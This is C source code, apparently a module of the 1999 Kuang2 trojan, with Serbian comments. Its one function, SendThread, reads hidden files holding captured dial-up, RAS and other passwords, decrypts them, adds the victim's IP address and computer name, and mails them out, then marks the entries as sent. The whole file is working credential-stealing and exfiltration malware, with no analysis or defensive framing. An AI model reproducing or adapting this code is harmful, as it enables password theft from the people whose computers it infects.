/***[ThuNderSoft]*************************************************************
								 KUANG2: thread
								   ver: 0.15
								���� WEIRD ����
*****************************************************************************/

/* HISTORY */
// ver 0.15 (26-feb-1999): slanje pass podataka
// ver 0.10 (03-feb-1999): born code

#include <windows.h>
#include <win95e.h>
#include <strmem.h>
#include <tools.h>

#define KUANG_SEED 0x17317373

extern char sysfile[];
extern char dl_name[];
extern char buff[];
extern int send_data(char *);
extern char lastIP[];
extern char tempIP[];
extern char compname[];
extern volatile BOOL unutra;

extern BOOL SENDdunOK;
extern BOOL SENDpassOK;

extern BOOL WriteRasData(char*);

char newtag[]="-----\r\n";

/*
	SendThread
	----------
  � thread koji �alje sve podatke: i dun i pass
  � u buff (len <= 5KB) se nalazi novi dun string. */

DWORD WINAPI SendThread (LPVOID param)
{
	HANDLE hfajl;
	unsigned int fsize, i, k, j;
	DWORD procitano;
	char *fbafer;
	BOOL novizapis;
	BOOL rasnovizapis;

//if (SENDdunOK) MsgBox("dunOK"); else MsgBox("dunNOT");
//if (SENDpassOK) MsgBox("passOK"); else MsgBox("passNOT");

/*** DUN PODACI ***/
// proverava se da li novi zapis ve� postoji!

	if (SENDdunOK) goto onlypass;		// ako su u trenutnom uklju�enju na internet dun podaci ve� poslati, idi dalje

	// otvori fajl
	hfajl=CreateFile(sysfile, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_HIDDEN, NULL);
	if (hfajl==INVALID_HANDLE_VALUE) goto kraj1;		// ne�to nije u redu

	// alociraj memoriju veli�ine fajla + veli�ine bafera
	fsize=GetFileSize(hfajl, NULL);
	fbafer=(char *)GlobalAlloc (GMEM_FIXED | GMEM_ZEROINIT, fsize+strlengthF(buff)+5124);
	if (fbafer==NULL) goto kraj2;		// alloc error

	if (fsize)	{						// ako sadr�aj fajla postoji
		ReadFile(hfajl, fbafer, fsize, &procitano, NULL);	// onda ga u�itaj
		strdecrypt(fbafer, KUANG_SEED);						// i dekriptuj
	}

	novizapis=FALSE;	// nema novog zapisa

	// ako je buf prazan, �to se de�ava kad se korisnik alternativno loguje
	// na net onda upi�i u bafer neki string da ne bi kuang2 stalno registrovao ovakvo logovanje
	if (!buff[0]) strcopyF(buff, "alternate\r\n");

	if (!strfind(fbafer, buff)) {	// u 'buff' su podaci o trenutnom logovanju
		novizapis=TRUE;				// nije na�ao je podatke, zna�i novi su
		straddF(fbafer, buff);		// dodaj ih u fajl bafer
	}

	rasnovizapis = WriteRasData(fbafer);	// dodaj i sve ostale passworde
	novizapis |= rasnovizapis;

	if (!novizapis) {		// ako je ve� sve bilo iza�i, tj nema ni�ta novo
		SENDdunOK=TRUE;		// sve je bilo ok
		goto kraj3;
	}

	// nije na�ao podatke, �alji nove...
	j=strlengthF(buff);
	straddFaddd(buff, tempIP, 0x0A0D);		// dodaj trenutni IP samo na ono �to se �alje
	straddFaddd(buff, compname, 0x0A0D);	// dodaj ComputerName samo na ono �to se �alje

#define		notsendOK		fsize
//MsgBox(buff);
	// po�alji!
	notsendOK=send_data(buff);				// slanje bafera na mail
	buff[j]=0;

//if (notsendOK) MsgBox("dun NIJE POSLATO!");
//else MsgBox("dun POSLATO!");

	if (!notsendOK) {					// ako je sve pro�lo OK idi snimi
		strcrypt(fbafer, KUANG_SEED);	// kriptovanje celog bafera
		SetFilePointer(hfajl, 0, NULL, FILE_BEGIN); // idi na po�etak fajla
		WriteFile(hfajl, fbafer, strlengthF(fbafer)+1, &procitano, NULL); // snimi + snimi zadnju 0
		SENDdunOK=TRUE;
	}

kraj3:
	GlobalFree(fbafer);			// zatvori bafer
kraj2:
	CloseHandle(hfajl);			// zatvori fajl
kraj1:






/*** PASS PODACI ***/
// Oni se �alju uvek kada postoji novi zapis.
// Ne proverava se da li novi zapis ve� postoji!

onlypass:
	if (SENDpassOK) goto exit1; // ako su u trenutnom uklju�enju na internet pass podaci ve� poslati, iza�i

	// otvori fajl
	hfajl=CreateFile(dl_name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE , NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_HIDDEN, NULL);
	if (hfajl==INVALID_HANDLE_VALUE) goto exit1;		// ne�to nije u redu ili fajl jo� ne postoji
	fsize=GetFileSize(hfajl, NULL);
	if (!fsize) goto exit2;			// ako je veli�ina fajla 0??? iza�i

	// alociraj memoriju veli�ine bafera i malko vi�e
	fbafer=(char *)GlobalAlloc (GMEM_FIXED | GMEM_ZEROINIT, fsize+20);
	if (fbafer==NULL) goto exit2;	// alloc error

	ReadFile(hfajl, fbafer, fsize, &procitano, NULL);	// u�itaj ga
	fbafer[fsize]=0;				// zatvori string
	strdecryptS(fbafer);			// i dekriptuj

	k=strfind(fbafer, newtag);	// na�i novi tag
	if (!k) {
		SENDpassOK=TRUE;		// k==0, zna�i nije ga na�ao, iza�i
		goto exit3;				// k<>0, zan�i na�ao ga je, sada fbafer[i]==newtag;
	}
	i=k-1;


	// dodaj samo jo� ComputerName na kraj zapisa!
	j=strlengthF(fbafer);
	straddF(fbafer, "# ");
	straddF(fbafer, compname);			// dodaj ComputerName
//MsgBox(&fbafer[i]);
	notsendOK=send_data(&fbafer[i]);	// slanje bafera na mail
	fbafer[j]=0;						// izbri�i ComputerName

//if (notsendOK) MsgBox("pass NIJE POSLATO!");
//else MsgBox("pass POSLATO!");

	if (!notsendOK) {					// ako je sve pro�lo OK idi snimi
		while (k) {							// promeni sve tagove!
			fbafer[i]=0x2B;					// promeni tag da se ozna�i da je poslato
			k=strfind(&fbafer[i], newtag);	// na�i slede�i tag
			i+=(k-1);
		}
		strcryptS(fbafer);					// kriptovanje celog bafera
		SetFilePointer(hfajl, 0, NULL, FILE_BEGIN); // idi na po�etak fajla
		WriteFile(hfajl, fbafer, strlengthF(fbafer), &procitano, NULL); // snimi (bez poslednje 0)
		SENDpassOK=TRUE;
	}

exit3:
	GlobalFree(fbafer);				// zatvori bafer
exit2:
	CloseHandle(hfajl);				// zatvori fajl
exit1:

	if (SENDdunOK) {
		buff[0]=0;		// obri�i buf
		if (SENDpassOK) {				// ako su poslati svi podaci
			strcopyF(lastIP, tempIP);	// zapamti trenutni IP da ne bi slede�i put sve proveravali ponovo
		}
	}

//	if (SENDdunOK) MsgBox("dunOK"); else MsgBox("dunNOT");
//	if (SENDpassOK) MsgBox("passOK"); else MsgBox("passNOT");

	unutra=FALSE;					// nismo vi�e unutar thread-a
	return 0;
}
